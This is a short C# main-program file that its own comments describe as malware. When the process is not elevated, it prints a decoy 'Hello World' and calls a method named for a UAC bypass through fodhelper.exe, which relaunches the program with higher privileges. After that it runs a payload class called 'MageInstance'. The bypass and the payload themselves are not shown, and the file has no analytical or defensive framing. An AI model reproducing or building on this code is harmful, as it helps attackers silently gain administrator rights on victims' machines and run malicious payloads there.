using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Xml.Linq;
using Testing;

namespace Testing
{
    class Program
    {

        static void Main(string[] args)
        { 
            //the check is for determining weather the program is running as admin. if not,
            //it will execute a privilege esecelation exploit that uses a vulnarbility in fodhelper.exe process
            //the exploit uses that process to execute the malware again by this process on higher privileges


            if (!PrivilegeEscelator.IsRunnigAsAdmin())
            {
                Console.WriteLine("Hello World");
                PrivilegeEscelator.UserAccountControlBypassOverFodHelperExe();
                Environment.Exit(0);
            }
            MageInstance mage = new MageInstance();
            mage.MageExecution();
        }
    }
}
